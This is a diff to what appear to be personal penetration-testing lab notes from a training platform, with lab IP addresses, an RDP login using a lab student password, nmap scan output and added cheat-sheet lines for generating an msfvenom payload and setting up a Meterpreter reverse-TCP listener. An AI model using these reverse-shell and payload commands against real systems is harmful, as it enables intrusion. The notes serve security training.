@@ -644,7 +644,7 @@ foothold 10.129.195.173
 ourpawn: 10.10.15.33
 $xfreerdp /v:10.129.195.173 /u:htb-student /p:HTB_@cademy_stdnt!
 
-host 1 result
+host 1 result 172.16.1.11:8080  foothold 10.129.204.126 pwn
 Not shown: 989 closed tcp ports (conn-refused)
 PORT     STATE SERVICE       VERSION
 80/tcp   open  http          Microsoft IIS httpd 10.0
@@ -678,6 +678,12 @@ PORT     STATE SERVICE       VERSION
 |_http-title: Apache Tomcat/10.0.11
 |_http-open-proxy: Proxy might be redirecting requests
 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+$xfreerdp /v:<ip> /u:<user> /p:<pass>
+$msfvenom -p <payload> LHOST=<LHOST> LPORT=<LPORT> -f <FORMAT> -o <outfile>
+start handle> $msfconsole use exploit/mutil/handler 
+>set PAYLOAD windows/meterpreter/reverse-tcp  >set LHOST <ip>   >set LPORT 4444 run-j 
+
+
 
 Host script results:
 | smb-security-mode: 
